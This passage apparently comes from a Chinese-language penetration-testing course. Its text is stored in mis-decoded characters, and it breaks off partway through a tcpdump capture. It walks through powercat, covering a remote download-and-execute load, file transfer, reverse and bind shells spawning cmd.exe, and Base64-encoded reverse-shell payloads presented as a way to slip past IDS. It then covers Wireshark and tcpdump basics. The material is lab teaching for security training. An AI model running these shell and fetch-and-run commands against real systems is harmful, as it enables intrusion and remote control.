è„šæœ¬ã€‚è¿™å°†ä½¿è„šæœ¬ä¸­å£°æ˜çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°åœ¨å½“å‰ PowerShell èŒƒå›´å†…å¯ä»¥ç”¨ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ PowerShell ä¸­ç›´æ¥ä½¿ç”¨ Powercat å‡½æ•°ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ‰§è¡Œè¯¥è„šæœ¬ã€‚\n\n```bash\nPS C:\\\\Users\\\\Offsec> . .\\\\powercat.ps1\n```\n\nå¦‚æœç›®æ ‡æœºå™¨è¿æ¥åˆ°äº’è”ç½‘ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡ä½¿ç”¨æ–¹ä¾¿çš„ iex cmdletï¼Œç”¨è¿œç¨‹è„šæœ¬åšåŒæ ·çš„äº‹æƒ…ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\nPS C:\\\\Users\\\\Offsec> iex (New-Object System.Net.Webclient).DownloadString('<https://raw.githubusercontent.com/besimorhino/po> wercat/master/powercat.ps1')\n```\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä»¥è¿™ç§æ–¹å¼åŠ è½½çš„è„šæœ¬åªèƒ½åœ¨å½“å‰çš„ PowerShell å®ä¾‹ä¸­ä½¿ç”¨ï¼Œè€Œä¸”æ¯æ¬¡æˆ‘ä»¬é‡å¯ PwerShell æ—¶éƒ½éœ€è¦é‡æ–°åŠ è½½ã€‚\n\nç°åœ¨æˆ‘ä»¬çš„è„šæœ¬å·²ç»åŠ è½½å®Œæ¯•ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æ‰§è¡Œ powercatã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat\nYou must select either client mode (-c) or listen mode (-l).\n```\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹å¸®åŠ©èœå•å¿«é€Ÿç†Ÿæ‚‰ Powercatï¼š\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -h\npowercat - Netcat, The Powershell Version\nGithub Repository: <https://github.com/besimorhino/powercat>\nThis script attempts to implement the features of netcat in a powershell\nscript. It also contains extra features such as built-in relays, execute\npowershell, and a dnscat2 client.\nUsage: powercat [-c or -l] [-p port] [options]\n -c <ip> Client Mode. Provide the IP of the system you wish to connect to.\n If you are using -dns, specify the DNS Server to send queries to.\n -l Listen Mode. Start a listener on the port specified by -p.\n -p <port> Port. The port to connect to, or the port to listen on.\n -e <proc> Execute. Specify the name of the process to start.\n...\n -i <input> Input. Provide data to be sent down the pipe as soon as a connection\n established. Used for moving files. You can provide the path to a fi\n a byte array object, or a string. You can also pipe any of those int\npowercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80\n...\n -g Generate Payload. Returns a script as a string which will execute t\n powercat with the options you have specified. -i, -d, and -rep will\n be incorporated.\n -ge Generate Encoded Payload. Does the same as -g, but returns a string\n can be executed in this way: powershell -E <encoded string>\n -h Print this help message.\n...\n```\n\nè®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨ powercat è¿›è¡Œæ–‡ä»¶ä¼ è¾“ï¼Œå¹¶åƒä»¥å‰çš„å·¥å…·é‚£æ ·è¿›è¡Œæ­£å‘å’Œåå‘ Shellã€‚\n\n### Powercat æ–‡ä»¶ä¼ è¾“\n\nå°½ç®¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‰é¢è®¨è®ºçš„ä»»ä½•å·¥å…·å°† Powercat ä¼ è¾“åˆ°æˆ‘ä»¬çš„ç›®æ ‡ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ powercat å°†è‡ªå·±ï¼ˆpowercat.ps1ï¼‰ä» Bob ä¼ è¾“åˆ° Aliceï¼Œä½œä¸ºæ¼”ç¤ºç”¨ powercat ä¼ è¾“æ–‡ä»¶çš„æ–¹æ³•ã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬åœ¨ Alice çš„ç”µè„‘ä¸Šè¿è¡Œä¸€ä¸ª Netcat ç›‘å¬å™¨ã€‚\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661\n```\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨ Bob çš„ç”µè„‘ä¸Šè°ƒç”¨ powercatã€‚ `-c` é€‰é¡¹æŒ‡å®šäº†å®¢æˆ·ç«¯æ¨¡å¼å¹¶è®¾ç½®äº†ç›‘å¬ IP åœ°å€ï¼Œ `-p` æŒ‡å®šäº†è¿æ¥çš„ç«¯å£å·ï¼Œ `-i`  è¡¨ç¤ºå°†è¢«è¿œç¨‹ä¼ è¾“çš„æœ¬åœ°æ–‡ä»¶ã€‚\n\n```bash\nPS C:\\\\Users\\\\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\\\\Users\\\\Offsec\\\\powercat.ps1\n```\n\næœ€åï¼Œ Alice å°† kill Netcat è¿›ç¨‹ï¼Œå¹¶æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»æ”¶åˆ°ã€‚\n\n```bash\n^C\nkali@kali:~$ ls receiving_powercat.ps1\nreceiving_powercat.ps1\n```\n\n### Powercat åå‘ Shell\n\nåå‘ Shell çš„è¿‡ç¨‹ä¸æˆ‘ä»¬å·²ç»çœ‹åˆ°çš„ç±»ä¼¼ã€‚æˆ‘ä»¬å°†åœ¨ Alice çš„è®¡ç®—æœºä¸Šå¯åŠ¨ä¸€ä¸ª Netcat ç›‘å¬å™¨ã€‚ç„¶å Bob å°†ä½¿ç”¨ powercat æ¥å‘é€ä¸€ä¸ªåå‘ shellã€‚\n\næˆ‘ä»¬ä» Alice çš„æœºå™¨ä¸Šçš„ Netcat ç›‘å¬å™¨å¼€å§‹ï¼š\n\n```bash\nkali@kali:~$ sudo nc -lvp 443\nlistening on [any] 443 ...\n```\n\næ¥ä¸‹æ¥ï¼ŒBob å°†ä½¿ç”¨ powercat æ¥å‘é€ä¸€ä¸ªåå‘ shellã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ `-e` é€‰é¡¹æŒ‡å®šäº†ä¸€æ—¦è¿æ¥åˆ°ä¸€ä¸ªç›‘å¬ç«¯å£æ—¶è¦æ‰§è¡Œçš„åº”ç”¨ç¨‹åºï¼ˆcmd.exeï¼‰ã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe\n```\n\næœ€åï¼ŒAlice çš„ Netcat ç›‘å¬å™¨å°†æ”¶åˆ° shellã€‚\n\n```bash\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat æ­£å‘ Shell\n\nç›¸æ¯”ä¹‹ä¸‹ï¼Œpowercat æ­£å‘ shell æ˜¯åœ¨ Bob é‚£è¾¹ç”¨ powercat ç›‘å¬å™¨å¯åŠ¨çš„ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ `-l` é€‰é¡¹æ¥åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨ï¼Œ `-p` æŒ‡å®šç›‘å¬ç«¯å£å·ï¼Œ `-e` åœ¨è¿æ¥åæ‰§è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆcmd.exeï¼‰ã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -l -p 443 -e cmd.exe\n```\n\næ¥ä¸‹æ¥ï¼ŒAlice å°†åˆ›å»ºä¸€ä¸ª Netcat è¿æ¥åˆ° Bob çš„è®¡ç®—æœºä¸Šçš„æ­£å‘ shellã€‚\n\n```bash\nkali@kali:~$ nc 10.11.0.22 443\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat ç‹¬ç«‹ Payload\n\nPowercat è¿˜å¯ä»¥ç”Ÿæˆç‹¬ç«‹çš„ Payloadã€‚åœ¨ powercat çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œpayload æ˜¯ä¸€ç»„ powershell æŒ‡ä»¤ä»¥åŠä»…åŒ…å«ç”¨æˆ·è¯·æ±‚çš„åŠŸèƒ½çš„ powercat è„šæœ¬æœ¬èº«çš„éƒ¨åˆ†ï¼ŒåªåŒ…æ‹¬ç”¨æˆ·è¦æ±‚çš„åŠŸèƒ½ã€‚è®©æˆ‘ä»¬åœ¨ä¸‹ä¸€ä¸ªä¾‹å­ä¸­è¯•éªŒä¸€ä¸‹ payloadã€‚\n\nåœ¨ Alice çš„æœºå™¨ä¸Šå¯åŠ¨ç›‘å¬å™¨åï¼Œæˆ‘ä»¬é€šè¿‡åœ¨ä¹‹å‰çš„ powercat å‘½ä»¤ä¸­æ·»åŠ  `-g` é€‰é¡¹å¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶æ¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„åå‘ shell payloadã€‚è¿™å°†äº§ç”Ÿä¸€ä¸ª powershell è„šæœ¬ï¼ŒBob å¯ä»¥åœ¨ä»–çš„ç”µè„‘ä¸Šæ‰§è¡Œã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1\n\nPS C:\\\\Users\\\\offsec> ./reverseshell.ps1\n```\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåƒè¿™ç§ç‹¬ç«‹çš„ payload å¯èƒ½å¾ˆå®¹æ˜“è¢« IDS å‘ç°ã€‚å…·ä½“è€Œè¨€ï¼Œç”Ÿæˆçš„è„šæœ¬ç›¸å½“å¤§ï¼Œå¤§çº¦æœ‰ 300 è¡Œä»£ç ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜åŒ…å«ä¸€ä¸ªç¡¬ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨äºæ¶æ„æ´»åŠ¨çš„ç­¾åä¸­ã€‚è™½ç„¶è¯†åˆ«ä»»ä½•å…·ä½“çš„ç­¾åä¸åœ¨æœ¬æ¨¡å—çš„èŒƒå›´å†…ï¼Œä½†è¶³ä»¥è¯´æ˜åƒè¿™æ ·çš„çº¯æ–‡æœ¬æ¶æ„ä»£ç å¯èƒ½ä¼šæœ‰ä¸€ä¸ªå¾ˆå·®çš„æˆåŠŸç‡ï¼Œå¹¶å¯èƒ½è¢«é˜²å¾¡æ€§è½¯ä»¶è§£å†³æ–¹æ¡ˆç»™æ‹¦æˆªã€‚\n\næˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡åˆ©ç”¨ PowerShell æ‰§è¡Œ Base64 ç¼–ç å‘½ä»¤çš„èƒ½åŠ›æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä¸ºäº†ç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„ç¼–ç çš„ Payloadï¼Œæˆ‘ä»¬ä½¿ç”¨ `-ge` é€‰é¡¹ï¼Œå¹¶å†æ¬¡å°†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1\n```\n\nè¯¥æ–‡ä»¶åŒ…å«ä¸€ä¸ªç¼–ç å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ PowerShell -Eï¼ˆEncodedCommandï¼‰é€‰é¡¹æ¥æ‰§è¡Œã€‚ç„¶è€Œï¼Œç”±äº `-E` é€‰é¡¹è¢«è®¾è®¡ä¸ºä¸€ç§åœ¨å‘½ä»¤è¡Œä¸Šæäº¤å¤æ‚å‘½ä»¤çš„æ–¹å¼ï¼Œæ‰€äº§ç”Ÿçš„ encodedreverseshell.ps1 è„šæœ¬ä¸èƒ½åƒæˆ‘ä»¬çš„æœªç¼–ç çš„ Payload ä¸€æ ·è¢«æ‰§è¡Œã€‚ç›¸åï¼ŒBob éœ€è¦å°†æ•´ä¸ªç¼–ç çš„å­—ç¬¦ä¸²ä¼ é€’ç»™ powershell.exe -Eã€‚\n\n```bash\nPS C:\\\\Users\\\\offsec> powershell.exe -E\nZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH\nIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAs\nACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYg\nBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAA\nIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgAC\nAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBl\nAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA\nBlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA\n...\n```\n\nåœ¨è¿è¡Œç‹¬ç«‹çš„ Payload åï¼ŒAlice åœ¨å¥¹ç­‰å¾…çš„ç›‘å¬å™¨ä¸Šæ”¶åˆ°äº†åå‘ Shellã€‚\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725\n\nPS C:\\\\Users\\\\offsec>\n```\n\næˆ‘ä»¬å·²ç»ä»‹ç»äº†å„ç§å¯ä»¥å¤„ç†æ–‡ä»¶ä¼ è¾“ã€æ­£å‘ Shell å’Œ åå‘ Shell çš„å·¥å…·ã€‚è¿™äº›å·¥å…·åœ¨æ¸—é€æµ‹è¯•ä¸­å…·æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€ä¼˜åŠ¿ã€å¼±ç‚¹å’Œé€‚ç”¨æ€§ã€‚ä½ å¯ä»¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹ powercat çš„åŠŸèƒ½ï¼Œä»¥å®Œå–„ä½ å¯¹è¿™ä¸ªä¼Ÿå¤§å·¥å…·ç³»åˆ—çš„æ¥è§¦ã€‚\n\n## Wireshark\n\nä¸€ä¸ªåˆæ ¼çš„æ¸—é€æµ‹è¯•å‘˜åº”è¯¥ç²¾é€šç½‘ç»œåŸºç¡€åªæ˜¯ã€‚ç½‘ç»œå—…æ¢å™¨ï¼Œå¦‚ä¸šç•Œä¸»è¦çš„ Wiresharkï¼Œæ˜¯å­¦ä¹ ç½‘ç»œåè®®ã€åˆ†æç½‘ç»œæµé‡å’Œè°ƒè¯•ç½‘ç»œæœåŠ¡çš„å¿…å¤‡å·¥å…·ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºä¸€äº› Wireshark çš„åŸºç¡€çŸ¥è¯†ã€‚\n\n### Wireshark åŸºç¡€çŸ¥è¯†\n\nWireshark ä½¿ç”¨ Libpcapï¼ˆåœ¨ Linux ä¸Šï¼‰æˆ– Winpcapï¼ˆåœ¨ Windows ä¸Šï¼‰åº“ï¼Œä»¥ä¾¿ä»ç½‘ç»œä¸Šæ•è·æ•°æ®åŒ…ã€‚\n\nåœ¨ç”¨å—…æ¢å™¨åˆ†æç½‘ç»œæµé‡æ—¶ï¼Œå¾ˆå®¹æ˜“è¢«æ”¶é›†çš„æ•°æ®ä¸­çš„å¤§é‡â€œå™ªéŸ³â€æ‰€æ·¹æ²¡ã€‚ä¸ºäº†æ–¹ä¾¿åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Wireshark ä¸­åº”ç”¨æ•è·è¿‡æ»¤å™¨å’Œæ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚å¦‚æœæˆ‘ä»¬åœ¨ Wireshark ä¼šè¯ä¸­åº”ç”¨æ•è·è¿‡æ»¤å™¨ï¼Œä»»ä½•ä¸ç¬¦åˆè¿‡æ»¤å™¨æ ‡å‡†çš„æ•°æ®åŒ…å°†è¢«ä¸¢å¼ƒï¼Œå‰©ä½™çš„æ•°æ®å°†è¢«ä¼ é€’ç»™æ•è·å¼•æ“ã€‚ç„¶åï¼Œæ•è·å¼•æ“å¯¹ä¼ å…¥çš„æ•°æ®åŒ…è¿›è¡Œå‰–æï¼Œåˆ†æå®ƒä»¬ï¼Œæœ€ååœ¨æ˜¾ç¤ºè¾“å‡ºä¹‹å‰åº”ç”¨ä»»ä½•é¢å¤–çš„æ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚\n\nè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç”¨ä¸‹å›¾æ¥è¯´æ˜ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/80dc3f76-6a7f-4185-8d63-cc2e5ed98c65/Untitled.png)\n\nä½¿ç”¨ä»»ä½•ç½‘ç»œå—…æ¢å™¨ï¼ˆåŒ…æ‹¬ Wiresharkï¼‰çš„ç§˜è¯€æ˜¯å­¦ä¼šå¦‚ä½•ä½¿ç”¨æ•è·å’Œæ˜¾ç¤ºè¿‡æ»¤å™¨æ¥å‰¥ç¦»å¤šä½™çš„æ•°æ®ã€‚å¹¸è¿çš„æ˜¯ï¼ŒWiresahrk çš„å›¾å½¢ç•Œé¢ä½¿å¾—æ•°æ®çš„å¯è§†åŒ–å’Œå„ç§è¿‡æ»¤å™¨çš„ä½¿ç”¨å˜å¾—ç›¸å¯¹å®¹æ˜“ã€‚\n\n### å¯åŠ¨ Wireshark\n\nåœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨åŒ¿åçš„ FTP ç™»å½•è¿‡ç¨‹ä¸­æ•è·ç½‘ç»œæµé‡ã€‚åœ¨æˆ‘ä»¬çš„ Kali ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å‘½ä»¤è¡Œå¯åŠ¨ Wiresharkï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œæˆ–è€…é€šè¿‡åº”ç”¨ç¨‹åºèœå•å¯åŠ¨ï¼Œå®ƒä½äº Sniffing & Spoofing å­èœå•ä¸‹ã€‚\n\n```bash\nkali@kali:~$ sudo wireshark\n```\n\n### æ•è·è¿‡æ»¤å™¨\n\nå½“ Wiresahrk åŠ è½½æ—¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªåŸºæœ¬çš„çª—å£ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æˆ‘ä»¬è¦ç›‘æ§çš„ç½‘ç»œæ¥å£ï¼Œä»¥åŠè®¾ç½®æ˜¾ç¤ºå’Œæ•è·è¿‡æ»¤å™¨ã€‚å¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•è·è¿‡æ»¤å™¨ï¼Œé€šè¿‡ä¸¢å¼ƒä»»ä½•ä¸ç¬¦åˆæˆ‘ä»¬çš„è¿‡æ»¤å™¨çš„æµé‡æ¥å‡å°‘æ•è·çš„æµé‡ï¼Œå¹¶å°†æˆ‘ä»¬çš„æ³¨æ„åŠ›ç¼©å°åˆ°æˆ‘ä»¬å¸Œæœ›åˆ†æçš„æ•°æ®åŒ…ã€‚è¯·æ³¨æ„ï¼Œä»æ•è·è¿‡æ»¤å™¨ä¸­æ’é™¤çš„ä»»ä½•æµé‡éƒ½ä¼šä¸¢å¤±ï¼Œå› æ­¤ï¼Œå¦‚æœä½ æ‹…å¿ƒå¯èƒ½ä¼šä¸¢å¤±æ•°æ®ï¼Œæœ€å¥½å®šä¹‰å¹¿æ³›çš„æ•è·è¿‡æ»¤å™¨ã€‚\n\næˆ‘ä»¬é¦–å…ˆé€‰æ‹©æˆ‘ä»¬æƒ³è¦ç›‘æ§çš„æ¥å£ï¼Œç„¶åè¾“å…¥ä¸€ä¸ªæ•è·è¿‡æ»¤å™¨ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ net filter æ¥åªæ•è· 10.11.1.0/24 åœ°å€èŒƒå›´å†…çš„æµé‡ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/395e6991-68af-4fc5-8859-a8cdf146e299/Untitled.png)\n\nä¹Ÿå¯ä»¥é€šè¿‡å¯¼èˆªåˆ° Capture > Capture filters æ¥é€‰æ‹©é¢„å®šä¹‰çš„æ•è·è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç‚¹å‡» `+` å·æ¥æ·»åŠ è‡ªå·±çš„æ•è·è¿‡æ»¤å™¨ã€‚è®¾ç½®å¥½æ•è·è¿‡æ»¤å™¨åï¼Œæˆ‘ä»¬å¯ä»¥ä»å¥½ç”¨çš„æ¥å£åˆ—è¡¨ä¸­åŒå‡»æˆ‘ä»¬çš„ç½‘ç»œæ¥å£ï¼ˆtap0ï¼‰æ¥å¼€å§‹æ•è·ã€‚\n\n### æ˜¾ç¤ºè¿‡æ»¤å™¨\n\nç°åœ¨ Wireshark å·²ç»æ•æ‰åˆ°äº†æœ¬åœ°ç½‘ç»œä¸­çš„æ‰€æœ‰æµé‡ï¼Œæˆ‘ä»¬å¯ä»¥ç™»å½•åˆ° FTP æœåŠ¡å™¨å¹¶æ£€æŸ¥è¿™äº›æµé‡ã€‚\n\n```bash\nkali@kali:~$ ftp 10.11.1.13\nConnected to 10.11.1.13.\n220 Microsoft FTP Service\nName (10.11.1.13:kali): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:anonymous\n230 Anonymous user logged in.\nRemote system type is Windows_NT.\nftp> quit\n221\n```\n\nä¸ºäº†è¿›ä¸€æ­¥ç¼©å°èƒŒæ™¯æµé‡ï¼Œè®©æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œåªå…³æ³¨ FTP åè®®ã€‚æ˜¾ç¤ºè¿‡æ»¤å™¨æ¯”æ•è·è¿‡æ»¤å™¨è¦çµæ´»å¾—å¤šï¼Œè€Œä¸”è¯­æ³•ä¹Ÿç•¥æœ‰ä¸åŒã€‚é¡¾åæ€ä¹‰ï¼Œæ˜¾ç¤ºè¿‡æ»¤å™¨åªè¿‡æ»¤è¢«æ˜¾ç¤ºçš„æ•°æ®åŒ…ï¼Œè€Œ Wireshark ç»§ç»­åœ¨åå°æ•è· 10.11.1.0/24 åœ°å€èŒƒå›´å†…çš„æ‰€æœ‰ç½‘ç»œæµé‡ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç‚¹å‡»æ˜¾ç¤ºè¿‡æ»¤å™¨å³ä¾§çš„ â€œXâ€ å›¾æ ‡æ¥æ¸…é™¤æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œè€Œä¸å¿…é‡æ–°å¼€å§‹æ•è·ã€‚ä¸æ•è·è¿‡æ»¤å™¨ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç‚¹å‡»åˆ†äº« > æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œä»é¢„å®šä¹‰çš„åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚\n\nåˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚ç»™æˆ‘ä»¬åº”ç”¨ä¸€ä¸ªæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œåªæ˜¾ç¤º FTP æ•°æ®ï¼Œæˆ–ç«¯å£ 21 çš„ TCP æµé‡ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8bba53ff-454d-4d21-964f-f1dfeb9cad33/Untitled.png)\n\nè¿™ä¸ªè¿‡æ»¤å™¨å·¥ä½œå¾—éå¸¸å¥½ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ° 21 ç«¯å£ä¸Šåªæœ‰ FTP çš„æµé‡ã€‚\n\n### è·Ÿè¸ª TCP æµ\n\nWireshark å…è®¸æˆ‘ä»¬æŸ¥çœ‹ç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬æ¯ä¸ªæ•°æ®åŒ…çš„å†…å®¹ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬é€šå¸¸å¯¹å„ç§åº”ç”¨ä¹‹é—´çš„æ•°æ®æµæ›´æ„Ÿå…´è¶£ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Wireshark çš„èƒ½åŠ›æ¥é‡æ–°ç»„åˆä¸€ä¸ªç‰¹å®šçš„ä¼šè¯ï¼Œå¹¶ä»¥å„ç§æ ¼å¼æ˜¾ç¤ºã€‚è¦æŸ¥çœ‹ä¸€ä¸ªç‰¹å®šçš„ TCP æ•°æ®æµï¼Œæˆ‘ä»¬å¯ä»¥å³å‡»ä¸€ä¸ªæ„Ÿå…´è¶£çš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚åœ¨æˆ‘ä»¬çš„ FTP ä¼šè¯ä¸­åŒ…å« USER å‘½ä»¤çš„æ•°æ®åŒ…ï¼Œç„¶åé€‰æ‹©è·Ÿéš > TCP æµã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ea7eef6-0748-4b70-8c3f-2723eb4ec914/Untitled.png)\n\né‡æ–°ç»„åˆçš„ TCP æµæ›´å®¹æ˜“é˜…è¯»ï¼Œæˆ‘ä»¬å¯ä»¥å›é¡¾æˆ‘ä»¬ä¸ FTP æœåŠ¡å™¨çš„äº’åŠ¨ã€‚å› ä¸º FTP æ˜¯ä¸€ä¸ªæ˜æ–‡åè®®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° FTP å®¢æˆ·ç«¯å‘é€å’Œæ¥æ”¶çš„å‘½ä»¤å’Œè¾“å‡ºã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bc01cc48-bda3-4dbc-9309-3c79f70747be/Untitled.png)\n\n## Tcpdump\n\nTcpdump æ˜¯ä¸€ä¸ªåŸºäºæ–‡æœ¬çš„ç½‘ç»œå—…æ¢å™¨ï¼Œå°½ç®¡æ²¡æœ‰å›¾å½¢ç•Œé¢ï¼Œä½†å®ƒç²¾ç®€ã€å¼ºå¤§ã€çµæ´»ã€‚å®ƒæ˜¯è¿„ä»Šä¸ºæ­¢æœ€å¸¸ç”¨çš„å‘½ä»¤è¡Œæ•°æ®åŒ…åˆ†æå™¨ï¼Œå¯ä»¥åœ¨å¤§å¤šæ•° Unix å’Œ Linux æ“ä½œç³»ç»Ÿä¸Šæ‰¾åˆ°ï¼Œä½†æœ¬åœ°ç”¨æˆ·çš„æƒé™å†³å®šäº†æ•è·ç½‘ç»œæµé‡çš„èƒ½åŠ›ã€‚\n\nTcpdump æ—¢å¯ä»¥ä»ç½‘ç»œä¸Šæ•è·æµé‡ï¼Œä¹Ÿå¯ä»¥è¯»å–ç°æœ‰çš„æ•è·æ–‡ä»¶ã€‚è®©æˆ‘ä»¬çœ‹çœ‹ password_cracking_filered.pacp æ–‡ä»¶ä¸­å‘ç”Ÿäº†ä»€ä¹ˆï¼Œè¯¥æ–‡ä»¶æ—¶åœ¨é˜²ç«å¢™ä¸Šæ•è·çš„ã€‚ä¸‹è½½è¯¥æ–‡ä»¶å¹¶è·Ÿéšæˆ‘ä»¬ä¸€èµ·åˆ†ææ•°æ®ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†ç”¨ sudo å¯åŠ¨ tcpdumpï¼ˆæˆäºˆæ•è·æƒé™ï¼‰ï¼Œç”¨ `-r` é€‰é¡¹æ‰“å¼€æ–‡ä»¶ã€‚\n\n```bash\nkali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap\nreading from file password_cracking_filtered.pcap, link-type EN10MB (Ethernet)\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801023 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801030 